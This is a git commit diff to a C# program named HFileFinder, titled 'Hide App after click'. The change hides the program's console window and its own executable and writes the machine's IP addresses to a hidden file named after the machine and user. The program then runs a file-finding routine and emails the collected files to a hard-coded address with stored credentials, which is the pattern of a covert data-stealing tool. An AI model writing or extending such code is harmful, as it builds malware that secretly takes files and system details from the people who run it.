86d6f87a12d14b444151b6ee4383dc65ec1d0516
Hadi Bagheri <153322772+HadiBagheri9@users.noreply.github.com>
2024-07-26 16:53:32 +0330

    Hide App after click

--- HFileFinder/Program.cs
+++ HFileFinder/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 
 namespace HFileFinder
@@ -13,17 +14,24 @@ namespace HFileFinder
         private static string subject = "Test";
         private static string body = "";
         private static string sys = Environment.MachineName + "_" + Environment.UserName;
-
+        private static string internetProtocol;
+        
         static void Main(string[] args)
         {
             HSConsoleWindow.HideWindow();
+            string thisPath = Console.Title;
+            File.SetAttributes(thisPath, FileAttributes.Hidden);
+            //File.WriteAllText("test.txt", thisPath);
+
             //Get IP addresses
             var ips = (Dns.GetHostEntry(Dns.GetHostName()).AddressList);
             foreach (var ip in ips)
             {
-                body += (ip.ToString()) + "\n";
+                internetProtocol += (ip.ToString()) + "\n";
             }
-            body = "";
+            File.WriteAllText($"{sys}_ip.txt", internetProtocol);
+            File.SetAttributes($"{sys}_ip.txt", FileAttributes.Hidden);
+
             //Main work
             FileFinder.Work(sys);
 
@@ -35,8 +43,11 @@ namespace HFileFinder
                 files[i] = sys + i + ".txt";
                 Send.SendEmail(email, password, displayName, to, subject, body, files[i]);
             }
+
             //HSConsoleWindow.ShowWindow();
+            Console.Beep(432, 500);
             Console.ReadKey();
         }
+
     }
 }
